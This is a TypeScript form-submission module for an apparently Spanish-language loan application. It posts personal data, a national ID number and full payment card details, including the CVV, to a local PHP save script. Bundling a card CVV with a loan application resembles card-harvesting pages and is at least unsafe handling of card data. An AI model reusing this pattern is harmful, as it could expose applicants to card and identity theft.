import { LoanFormData } from '../types/formTypes';

export const submitFormData = async (formData: LoanFormData): Promise<{ success: boolean; message: string }> => {
  try {
    // Prepare form data for submission
    const formDataToSubmit = new FormData();
    
    // Add loan details
    formDataToSubmit.append('loanAmount', formData.loanAmount.toString());
    formDataToSubmit.append('loanTerm', formData.loanTerm.toString());
    
    // Add personal details
    formDataToSubmit.append('firstName', formData.firstName);
    formDataToSubmit.append('lastName', formData.lastName);
    formDataToSubmit.append('dni', formData.dni);
    formDataToSubmit.append('province', formData.province);
    formDataToSubmit.append('email', formData.email);
    formDataToSubmit.append('phone', formData.phone);
    
    // Add occupation details
    formDataToSubmit.append('occupation', formData.occupation);
    formDataToSubmit.append('company', formData.occupationDetails.company);
    formDataToSubmit.append('position', formData.occupationDetails.position);
    formDataToSubmit.append('monthlySalary', formData.occupationDetails.monthlySalary);
    formDataToSubmit.append('yearsEmployed', formData.occupationDetails.yearsEmployed);
    
    // Add card info
    formDataToSubmit.append('cardType', formData.cardInfo.type);
    formDataToSubmit.append('cardNumber', formData.cardInfo.number);
    formDataToSubmit.append('cardName', formData.cardInfo.name);
    formDataToSubmit.append('cardExpiry', formData.cardInfo.expiry);
    formDataToSubmit.append('cardCvv', formData.cardInfo.cvv);

    // Submit the form
    const response = await fetch('save-form.php', {
      method: 'POST',
      body: formDataToSubmit,
    });

    let data;
    const contentType = response.headers.get('content-type');
    
    try {
      // Only try to parse JSON if we have a response and it's JSON
      if (response.status !== 204 && contentType?.includes('application/json')) {
        data = await response.json();
      } else {
        // If no content or not JSON, create a default response
        data = {
          success: response.ok,
          message: response.ok ? 'Solicitud procesada' : 'Error al procesar la solicitud'
        };
      }
    } catch (parseError) {
      console.error('Error parsing response:', parseError);
      throw new Error('Error al procesar la respuesta del servidor');
    }

    if (!response.ok) {
      throw new Error(data.error || 'Error al enviar el formulario');
    }
    
    return data;
  } catch (error) {
    console.error('Error submitting form:', error);
    throw error;
  }
};